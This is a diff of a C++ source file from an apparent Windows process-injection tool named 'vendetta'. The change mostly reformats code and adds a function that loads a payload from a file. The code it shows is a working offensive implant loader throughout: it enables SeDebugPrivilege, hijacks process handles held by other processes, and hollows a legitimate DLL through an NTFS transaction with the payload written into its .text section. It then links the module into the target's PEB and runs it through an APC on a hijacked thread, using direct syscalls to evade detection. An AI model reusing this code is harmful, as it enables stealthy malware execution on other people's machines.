@@ -7,38 +7,8 @@ namespace vendetta
 {
 	namespace
 	{
-		struct Pattern
-		{
-			std::string signature;
-			std::vector<int> bytes;
-
-			explicit Pattern(const std::string& sig) : signature(sig),
-				bytes(ParsePattern(sig))
-			{
-			}
-
-			static std::vector<int> ParsePattern(const std::string& pattern)
-			{
-				std::vector<int> result;
-				std::istringstream iss(pattern);
-				std::string token;
-
-				while (iss >> token)
-				{
-					if (token == "?")
-					{
-						result.push_back(-1);
-						continue;
-					}
-					result.push_back(std::stoi(token, nullptr, 16));
-				}
-
-				return result;
-			}
-		};
-
 		MODULEENTRY32W GetModuleEntry32W(const wchar_t* moduleName,
-			const PROCESS_INFORMATION& pi)
+		                                 const PROCESS_INFORMATION& pi)
 		{
 			const HANDLE hSnap = CreateToolhelp32Snapshot(
 				TH32CS_SNAPMODULE, pi.dwProcessId);
@@ -56,28 +26,37 @@ namespace vendetta
 						CloseHandle(hSnap);
 						return me32;
 					}
-				} while (Module32NextW(hSnap, &me32));
+				}
+				while (Module32NextW(hSnap, &me32));
 			}
 			CloseHandle(hSnap);
 			return {};
 		}
 
-		bool SetPrivilege(const char* szPrivilege, bool bState = true) {
+		bool SetPrivilege(const char* szPrivilege, bool bState = true)
+		{
 			HANDLE hToken;
-			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+			if (!OpenProcessToken(GetCurrentProcess(),
+			                      TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+			                      &hToken))
 				return false;
 
-			TOKEN_PRIVILEGES TokenPrivileges = { 0 };
+			TOKEN_PRIVILEGES TokenPrivileges = {0};
 			TokenPrivileges.PrivilegeCount = 1;
-			TokenPrivileges.Privileges[0].Attributes = bState ? SE_PRIVILEGE_ENABLED : 0;
+			TokenPrivileges.Privileges[0].Attributes = bState
+				? SE_PRIVILEGE_ENABLED
+				: 0;
 
-			if (!LookupPrivilegeValueA(nullptr, szPrivilege, &TokenPrivileges.Privileges[0].Luid))
+			if (!LookupPrivilegeValueA(nullptr, szPrivilege,
+			                           &TokenPrivileges.Privileges[0].Luid))
 			{
 				CloseHandle(hToken);
 				return false;
 			}
 
-			if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
+			if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges,
+			                           sizeof(TOKEN_PRIVILEGES), nullptr,
+			                           nullptr))
 			{
 				CloseHandle(hToken);
 				return false;
@@ -88,35 +67,46 @@ namespace vendetta
 			return (GetLastError() == ERROR_SUCCESS);
 		}
 
-		BYTE GetProcessObjectTypeIndex() {
+		BYTE GetProcessObjectTypeIndex()
+		{
 			HANDLE hSelf = GetCurrentProcess();
 			HANDLE hRealSelf = nullptr;
 			// Create a specific handle to ourselves to search for
-			Sw3NtDuplicateObject(GetCurrentProcess(), hSelf, GetCurrentProcess(), &hRealSelf, 0, 0, DUPLICATE_SAME_ACCESS);
+			Sw3NtDuplicateObject(GetCurrentProcess(), hSelf,
+			                     GetCurrentProcess(), &hRealSelf, 0, 0,
+			                     DUPLICATE_SAME_ACCESS);
 
 			ULONG size = 0x10000;
 			PSYSTEM_HANDLE_INFORMATION_EX info;
 			NTSTATUS status;
 			BYTE typeIndex = 0;
 
-			do {
+			do
+			{
 				info = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
 					nullptr, size, MEM_COMMIT, PAGE_READWRITE));
-				status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, info, size, &size);
-				if (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH)) {
+				status = Sw3NtQuerySystemInformation(
+					SystemExtendedHandleInformation, info, size, &size);
+				if (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH))
+				{
 					VirtualFree(info, 0, MEM_RELEASE);
 					size *= 2;
 				}
-			} while (status == STATUS_INFO_LENGTH_MISMATCH);
+			}
+			while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-			if (NT_SUCCESS(status) && info) {
+			if (NT_SUCCESS(status) && info)
+			{
 				DWORD myPID = GetCurrentProcessId();
-				for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
+				for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++)
+				{
 					// Check if this entry matches our PID and our Handle value
-					if (info->Handles[i].UniqueProcessId == UlongToHandle(myPID) &&
-						info->Handles[i].HandleValue == hRealSelf) {
-
-						typeIndex = (BYTE)info->Handles[i].ObjectTypeIndex;
+					if (info->Handles[i].UniqueProcessId == UlongToHandle(myPID)
+						&&
+						info->Handles[i].HandleValue == hRealSelf)
+					{
+						typeIndex = static_cast<BYTE>(info->Handles[i].
+							ObjectTypeIndex);
 						break;
 					}
 				}
@@ -128,9 +118,9 @@ namespace vendetta
 		}
 
 		PVOID FindSignature(const PROCESS_INFORMATION& pi,
-			const wchar_t* moduleName, Pattern pattern)
+		                    const wchar_t* moduleName, Pattern pattern)
 		{
-			std::println("[*] Looking for pattern: {}...", pattern.signature);
+			std::println("[*] Looking for {}, pattern: {}", pattern.name, pattern.signature);
 
 			MODULEENTRY32W me32 = GetModuleEntry32W(moduleName, pi);
 			if (me32.modBaseAddr == nullptr)
@@ -150,7 +140,7 @@ namespace vendetta
 			if (!NT_SUCCESS(status) || bytesRead == 0)
 			{
 				std::println("[-] Sw3NtReadVirtualMemory failed. Error = {:x}",
-					status);
+				             status);
 				return nullptr;
 			}
 
@@ -159,8 +149,9 @@ namespace vendetta
 				bool found = true;
 				for (size_t j = 0; j < pattern.bytes.size(); ++j)
 				{
-					if (pattern.bytes[j] != -1 && memBuffer[i + j] != static_cast<
-						byte>(pattern.bytes[j]))
+					if (pattern.bytes[j] != -1 && memBuffer[i + j] !=
+						static_cast<
+							byte>(pattern.bytes[j]))
 					{
 						found = false;
 						break;
@@ -170,7 +161,7 @@ namespace vendetta
 				{
 					PVOID matchAddress = baseAddress + i;
 					std::println("[+] Pattern found at address: {:p}",
-						matchAddress);
+					             matchAddress);
 					return matchAddress;
 				}
 			}
@@ -178,11 +169,11 @@ namespace vendetta
 		}
 
 		bool execute_hijack_thread_apc_instant(const PROCESS_INFORMATION& pi,
-			const PPS_APC_ROUTINE
-			base_address,
-			const PVOID arg1 = nullptr,
-			const PVOID arg2 = nullptr,
-			const PVOID arg3 = nullptr)
+		                                       const PPS_APC_ROUTINE
+		                                       base_address,
+		                                       const PVOID arg1 = nullptr,
+		                                       const PVOID arg2 = nullptr,
+		                                       const PVOID arg3 = nullptr)
 		{
 			NTSTATUS status;
 
@@ -191,7 +182,7 @@ namespace vendetta
 			if (h_snap == INVALID_HANDLE_VALUE)
 			{
 				std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
-					GetLastError());
+				             GetLastError());
 				return false;
 			}
 
@@ -200,7 +191,7 @@ namespace vendetta
 			if (!Thread32First(h_snap, &te32))
 			{
 				std::println("[-] Thread32First failed. Error = {}",
-					GetLastError());
+				             GetLastError());
 				CloseHandle(h_snap);
 				return false;
 			}
@@ -220,18 +211,19 @@ namespace vendetta
 					obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
 
 					status = Sw3NtOpenThread(&h_thread_hijacked,
-						THREAD_ALL_ACCESS,
-						&obj_attr, &client_id);
+					                         THREAD_ALL_ACCESS,
+					                         &obj_attr, &client_id);
 					if (!NT_SUCCESS(status))
 					{
 						std::println("[-] Sw3NtOpenThread failed. Error = {}",
-							status);
+						             status);
 						CloseHandle(h_snap);
 						return false;
 					}
 					break;
 				}
-			} while (Thread32Next(h_snap, &te32));
+			}
+			while (Thread32Next(h_snap, &te32));
 			CloseHandle(h_snap);
 			if (h_thread_hijacked == INVALID_HANDLE_VALUE)
 			{
@@ -241,17 +233,21 @@ namespace vendetta
 			}
 
 			std::println(
-				"[*] Queueing Apc with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC.TID = {}.",
+				"[*] Queueing Apc. Executing {:p}, RCX: {}, RDX: {}, R8: {}.TID = {}.",
+				reinterpret_cast<PVOID>(base_address),
+				static_cast<PVOID>(arg1),
+				static_cast<PVOID>(arg2),
+				static_cast<PVOID>(arg3),
 				te32.th32ThreadID);
 			status = Sw3NtQueueApcThreadEx(h_thread_hijacked,
-				UlongToHandle(
-					QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC),
-				base_address,
-				arg1, arg2, arg3);
+			                               UlongToHandle(
+				                               QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC),
+			                               base_address,
+			                               arg1, arg2, arg3);
 			if (!NT_SUCCESS(status))
 			{
 				std::println("[-] Sw3NtQueueApcThreadEx failed. Error = {}",
-					status);
+				             status);
 				CloseHandle(h_thread_hijacked);
 				return false;
 			}
@@ -261,14 +257,13 @@ namespace vendetta
 		}
 
 		bool link_module_to_peb(const PROCESS_INFORMATION& pi,
-			const PVOID module_base_address,
-			const PVOID module_entry_point,
-			const ULONG image_size,
-			const std::wstring& image_path)
+		                        const PVOID module_base_address,
+		                        const PVOID module_entry_point,
+		                        const ULONG image_size,
+		                        const std::wstring& image_path)
 		{
-			Pattern ldrp_pattern(PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY);
 			PVOID remote_ldrp_func = FindSignature(
-				pi, L"ntdll.dll", ldrp_pattern);
+				pi, L"ntdll.dll", PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY);
 
 			if (!remote_ldrp_func)
 			{
@@ -308,8 +303,8 @@ namespace vendetta
 			uintptr_t addr_full_str = addr_base_str + base_name_size;
 			uintptr_t addr_ddag = addr_full_str + full_name_size;
 
-			LDR_DATA_TABLE_ENTRY local_entry = { nullptr };
-			LDR_DDAG_NODE local_ddag = { nullptr };
+			LDR_DATA_TABLE_ENTRY local_entry = {nullptr};
+			LDR_DDAG_NODE local_ddag = {nullptr};
 
 			local_ddag.State = LdrModulesReadyToRun;
 			local_ddag.LoadCount = 0xFFFFFFFF;
@@ -324,7 +319,8 @@ namespace vendetta
 			local_entry.TlsIndex = 0;
 			local_entry.ObsoleteLoadCount = 0xFFFF;
 			local_entry.ReferenceCount = 0xFFFFFFFF;
-			local_entry.Flags = LDRP_DONT_CALL_FOR_THREADS; // default flag is shit because loader executes the dll "randomly"
+			local_entry.Flags = LDRP_DONT_CALL_FOR_THREADS;
+			// default flag is shit because loader executes the dll "randomly"
 
 			local_entry.BaseDllName.Length = static_cast<USHORT>(base_name_size
 				- sizeof(wchar_t));
@@ -345,19 +341,19 @@ namespace vendetta
 			local_entry.HashLinks.Blink = nullptr;
 
 			Sw3NtWriteVirtualMemory(pi.hProcess,
-				reinterpret_cast<PVOID>(addr_entry),
-				&local_entry, sizeof(LDR_DATA_TABLE_ENTRY),
-				nullptr);
+			                        reinterpret_cast<PVOID>(addr_entry),
+			                        &local_entry, sizeof(LDR_DATA_TABLE_ENTRY),
+			                        nullptr);
 			Sw3NtWriteVirtualMemory(pi.hProcess,
-				reinterpret_cast<PVOID>(addr_base_str),
-				base_name.data(), base_name_size, nullptr);
+			                        reinterpret_cast<PVOID>(addr_base_str),
+			                        base_name.data(), base_name_size, nullptr);
 			Sw3NtWriteVirtualMemory(pi.hProcess,
-				reinterpret_cast<PVOID>(addr_full_str),
-				full_name.data(), full_name_size, nullptr);
+			                        reinterpret_cast<PVOID>(addr_full_str),
+			                        full_name.data(), full_name_size, nullptr);
 			Sw3NtWriteVirtualMemory(pi.hProcess,
-				reinterpret_cast<PVOID>(addr_ddag),
-				&local_ddag, sizeof(LDR_DDAG_NODE),
-				nullptr);
+			                        reinterpret_cast<PVOID>(addr_ddag),
+			                        &local_ddag, sizeof(LDR_DDAG_NODE),
+			                        nullptr);
 
 			std::println(
 				"[+] Memory allocated and LDR entry written.");
@@ -377,8 +373,8 @@ namespace vendetta
 	}
 
 	bool inject_phantom_dll(const PROCESS_INFORMATION& pi, const BYTE* buf,
-		SIZE_T buf_size,
-		const std::wstring& legitimate_dll_path)
+	                        SIZE_T buf_size,
+	                        const std::wstring& legitimate_dll_path)
 	{
 		if (legitimate_dll_path.empty())
 		{
@@ -387,17 +383,17 @@ namespace vendetta
 		}
 
 		std::println("[*] Reading Legitimate DLL: {}",
-			std::string(legitimate_dll_path.begin(),
-				legitimate_dll_path.end()));
+		             std::string(legitimate_dll_path.begin(),
+		                         legitimate_dll_path.end()));
 
 		const HANDLE hFile = CreateFileW(legitimate_dll_path.c_str(),
-			GENERIC_READ, FILE_SHARE_READ,
-			nullptr, OPEN_EXISTING, 0,
-			nullptr);
+		                                 GENERIC_READ, FILE_SHARE_READ,
+		                                 nullptr, OPEN_EXISTING, 0,
+		                                 nullptr);
 		if (hFile == INVALID_HANDLE_VALUE)
 		{
 			std::println("[-] Failed to open legitimate DLL: {}",
-				GetLastError());
+			             GetLastError());
 			return false;
 		}
 
@@ -405,7 +401,7 @@ namespace vendetta
 		std::vector<BYTE> pe_buffer(fileSize);
 		DWORD bytesRead = 0;
 		if (!ReadFile(hFile, pe_buffer.data(), fileSize, &bytesRead,
-			nullptr))
+		              nullptr))
 		{
 			std::println("[-] ReadFile failed.");
 			CloseHandle(hFile);
@@ -426,7 +422,7 @@ namespace vendetta
 		for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
 		{
 			if (strncmp(reinterpret_cast<char*>(pSection[i].Name), ".text",
-				5) == 0)
+			            5) == 0)
 			{
 				pTextSection = &pSection[i];
 				break;
@@ -448,7 +444,7 @@ namespace vendetta
 		}
 
 		HANDLE hTransaction;
-		OBJECT_ATTRIBUTES obj_attr = { sizeof(OBJECT_ATTRIBUTES) };
+		OBJECT_ATTRIBUTES obj_attr = {sizeof(OBJECT_ATTRIBUTES)};
 
 		NTSTATUS status = Sw3NtCreateTransaction(
 			&hTransaction,
@@ -478,14 +474,14 @@ namespace vendetta
 		if (hTransactedFile == INVALID_HANDLE_VALUE)
 		{
 			std::println("[-] CreateFileTransactedW failed: {}",
-				GetLastError());
+			             GetLastError());
 			Sw3NtClose(hTransaction);
 			return false;
 		}
 
 		std::println("[*] Patching .text section in memory...");
 		memcpy(pe_buffer.data() + pTextSection->PointerToRawData, buf,
-			buf_size);
+		       buf_size);
 
 		std::println("[+] Writing patched PE content to transaction...");
 
@@ -553,7 +549,7 @@ namespace vendetta
 
 		Sw3NtClose(hSection);
 		CloseHandle(hTransactedFile);
-		
+
 		status = Sw3NtRollbackTransaction(hTransaction, TRUE);
 		if (!NT_SUCCESS(status))
 		{
@@ -578,14 +574,15 @@ namespace vendetta
 		ULONG image_size = pNtRemote->OptionalHeader.SizeOfImage;
 
 		if (!link_module_to_peb(pi, remoteBase, executionAddress, image_size,
-			legitimate_dll_path))
+		                        legitimate_dll_path))
 		{
 			std::println("[-] Failed to link phantom dll to PEB.");
 			return false;
 		}
 
 		// execute via apc instant
-		if (!execute_hijack_thread_apc_instant(pi, static_cast<PPS_APC_ROUTINE>(executionAddress)))
+		if (!execute_hijack_thread_apc_instant(
+			pi, static_cast<PPS_APC_ROUTINE>(executionAddress)))
 		{
 			std::println("[-] Failed execute the entrypoint via APC.");
 			return false;
@@ -597,13 +594,16 @@ namespace vendetta
 
 	HANDLE hijack_process_handle(const DWORD target_pid)
 	{
-		if (!SetPrivilege("SeDebugPrivilege")) {
-			std::println("[-] Failed to grant SeDebug. Handle hijacking will not be available.");
+		if (!SetPrivilege("SeDebugPrivilege"))
+		{
+			std::println(
+				"[-] Failed to grant SeDebug. Handle hijacking will not be available.");
 			return INVALID_HANDLE_VALUE;
 		}
 
 		BYTE processTypeIndex = GetProcessObjectTypeIndex();
-		if (processTypeIndex == 0) {
+		if (processTypeIndex == 0)
+		{
 			std::println("[-] Failed to resolve Process Object Type Index.");
 			return INVALID_HANDLE_VALUE;
 		}
@@ -613,15 +613,21 @@ namespace vendetta
 		PSYSTEM_HANDLE_INFORMATION_EX handleInfo = nullptr;
 		NTSTATUS status;
 
-		do {
-			handleInfo = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
-				nullptr, buffer_size, MEM_COMMIT, PAGE_READWRITE));
+		do
+		{
+			handleInfo = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(
+				VirtualAlloc(
+					nullptr, buffer_size, MEM_COMMIT, PAGE_READWRITE));
 			if (!handleInfo) return INVALID_HANDLE_VALUE;
 
-			status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, buffer_size, &buffer_size);
-		} while (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH));
+			status = Sw3NtQuerySystemInformation(
+				SystemExtendedHandleInformation, handleInfo, buffer_size,
+				&buffer_size);
+		}
+		while (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH));
 
-		if (!NT_SUCCESS(status) || !handleInfo) {
+		if (!NT_SUCCESS(status) || !handleInfo)
+		{
 			std::println("[-] Query failed: {:x}", status);
 			if (handleInfo) VirtualFree(handleInfo, 0, MEM_RELEASE);
 			return INVALID_HANDLE_VALUE;
@@ -629,24 +635,27 @@ namespace vendetta
 
 		auto hHijacked = INVALID_HANDLE_VALUE;
 
-		for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
+		for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++)
+		{
 			const auto& entry = handleInfo->Handles[i];
 
 			if (entry.UniqueProcessId == UlongToHandle(target_pid)) continue;
-			if (entry.UniqueProcessId == UlongToHandle(0) || entry.UniqueProcessId == UlongToHandle(4)) continue;
+			if (entry.UniqueProcessId == UlongToHandle(0) || entry.
+				UniqueProcessId == UlongToHandle(4)) continue;
 
 			if (entry.ObjectTypeIndex != processTypeIndex) continue;
 
 			if ((entry.GrantedAccess & PROCESS_VM_WRITE) == 0) continue;
 
 			HANDLE hOwner = nullptr;
-			OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+			OBJECT_ATTRIBUTES objAttr = {sizeof(OBJECT_ATTRIBUTES)};
 			CLIENT_ID clientId;
 
 			clientId.UniqueProcess = entry.UniqueProcessId;
 			clientId.UniqueThread = nullptr;
 
-			status = Sw3NtOpenProcess(&hOwner, PROCESS_DUP_HANDLE, &objAttr, &clientId);
+			status = Sw3NtOpenProcess(&hOwner, PROCESS_DUP_HANDLE, &objAttr,
+			                          &clientId);
 			if (!NT_SUCCESS(status)) continue;
 
 			HANDLE hDup = nullptr;
@@ -662,11 +671,16 @@ namespace vendetta
 
 			Sw3NtClose(hOwner);
 
-			if (NT_SUCCESS(status)) {
+			if (NT_SUCCESS(status))
+			{
 				// Verify
-				if (GetProcessId(hDup) == target_pid) {
-					std::println("[+] Hijacked handle from PID: {} (Handle: {:p}, Access: {:x})",
-						reinterpret_cast<uintptr_t>(entry.UniqueProcessId), static_cast<PVOID>(entry.HandleValue), static_cast<unsigned int>(entry.GrantedAccess));
+				if (GetProcessId(hDup) == target_pid)
+				{
+					std::println(
+						"[+] Hijacked handle from PID: {} (Handle: {:p}, Access: {:x})",
+						reinterpret_cast<uintptr_t>(entry.UniqueProcessId),
+						static_cast<PVOID>(entry.HandleValue),
+						static_cast<unsigned int>(entry.GrantedAccess));
 
 					hHijacked = hDup;
 					break;
@@ -689,7 +703,22 @@ namespace vendetta
 				pi_.hProcess);
 	}
 
-	bool injector::create_process(const LPCSTR& benign_dll, const bool create_suspended)
+	std::vector<BYTE> injector::load_payload_from_file(const std::string& file)
+	{
+		std::ifstream in_file(file, std::ios::binary);
+		if (!in_file.good())
+			return {};
+
+		std::vector<unsigned char> data(
+			(std::istreambuf_iterator<char>(in_file)),
+			std::istreambuf_iterator<char>()
+		);
+
+		return data;
+	}
+
+	bool injector::create_process(const LPCSTR& benign_dll,
+	                              const bool create_suspended)
 	{
 		if (!CreateProcessA(
 			benign_dll,
@@ -704,7 +733,8 @@ namespace vendetta
 		return true;
 	}
 
-	bool injector::attach_to_process(const DWORD pid, const retrieve_handle_method handle_method)
+	bool injector::attach_to_process(const DWORD pid,
+	                                 const retrieve_handle_method handle_method)
 	{
 		pi_.dwProcessId = pid;
 
@@ -712,7 +742,8 @@ namespace vendetta
 		{
 		case hijack_handle:
 			pi_.hProcess = hijack_process_handle(pid);
-			if (pi_.hProcess == INVALID_HANDLE_VALUE || pi_.hProcess == nullptr) {
+			if (pi_.hProcess == INVALID_HANDLE_VALUE || pi_.hProcess == nullptr)
+			{
 				std::println("[-] Handle hijacking failed. Aborting.");
 				return false;
 			}
@@ -722,7 +753,7 @@ namespace vendetta
 			client_id.UniqueProcess = UlongToHandle(pi_.dwProcessId);
 			client_id.UniqueThread = nullptr;
 
-			OBJECT_ATTRIBUTES obj_attr = { 0 };
+			OBJECT_ATTRIBUTES obj_attr = {0};
 			obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
 
 			NTSTATUS status = Sw3NtOpenProcess(
@@ -731,14 +762,14 @@ namespace vendetta
 			if (!NT_SUCCESS(status))
 			{
 				std::println("[-] Sw3NtOpenProcess failed. Error = {}",
-					status);
+				             status);
 				return false;
 			}
 			if (pi_.hProcess == INVALID_HANDLE_VALUE)
 
 			{
 				std::println("[-] OpenProcess failed. Error = {}",
-					GetLastError());
+				             GetLastError());
 				return false;
 			}
 			break;
@@ -746,25 +777,27 @@ namespace vendetta
 		return true;
 	}
 
-	bool injector::attach_to_process_by_name(const std::wstring& process_name, const retrieve_handle_method handle_method)
+	bool injector::attach_to_process_by_name(const std::wstring& process_name,
+	                                         const retrieve_handle_method
+	                                         handle_method)
 	{
 		std::string process_name_str(process_name.begin(),
-			process_name.end());
+		                             process_name.end());
 
 		const HANDLE h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 		if (h_snap == INVALID_HANDLE_VALUE)
 		{
 			std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
-				GetLastError());
+			             GetLastError());
 			return false;
 		}
 
-		PROCESSENTRY32 pe32 = { 0 };
+		PROCESSENTRY32 pe32 = {0};
 		pe32.dwSize = sizeof(PROCESSENTRY32);
 		if (!Process32First(h_snap, &pe32))
 		{
 			std::println("[-] Process32First failed. Error = {}",
-				GetLastError());
+			             GetLastError());
 			CloseHandle(h_snap);
 			return false;
 		}
@@ -777,7 +810,8 @@ namespace vendetta
 				pi_.dwProcessId = pe32.th32ProcessID;
 				break;
 			}
-		} while (Process32Next(h_snap, &pe32));
+		}
+		while (Process32Next(h_snap, &pe32));
 		CloseHandle(h_snap);
 		if (pi_.dwProcessId == 0)
 		{
@@ -787,15 +821,15 @@ namespace vendetta
 
 		if (!attach_to_process(pe32.th32ProcessID, handle_method))
 			return false;
-		
+
 		std::println("[+] Attached to {}. PID = {}.", process_name_str,
-			pe32.th32ProcessID);
+		             pe32.th32ProcessID);
 
 		return true;
 	}
 
 	bool injector::inject(const std::wstring& benign_dll)
-		const
+	const
 	{
 		return inject_phantom_dll(
 			pi_, buf_, buf_size_, benign_dll);
